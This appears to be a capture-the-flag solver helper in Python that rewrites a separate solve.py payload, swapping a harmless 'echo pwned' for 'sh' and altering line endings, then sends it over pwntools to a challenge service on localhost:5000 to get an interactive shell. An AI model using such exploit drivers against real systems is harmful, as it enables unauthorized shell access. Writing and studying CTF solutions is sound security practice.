with open("solve.py", "r", encoding="u8") as f:
    script = f.read()

# solve.py is set up to work by running it normally as a python script
# we need to make a couple of changes to get shell on remote
replacements = (
    ("BACK_CNT := 1", "BACK_CNT := 2"),
    ("echo pwned", "sh"),
    ("\n", "\r")
)

for replacement in replacements:
    script = script.replace(*replacement)

from pwn import *

# context.log_level = "DEBUG"

#p = process(["python3.13", "../challenge/chal.py"])
p = remote('localhost', 5000)
p.sendlineafter(b"> ", script.encode())

p.interactive()
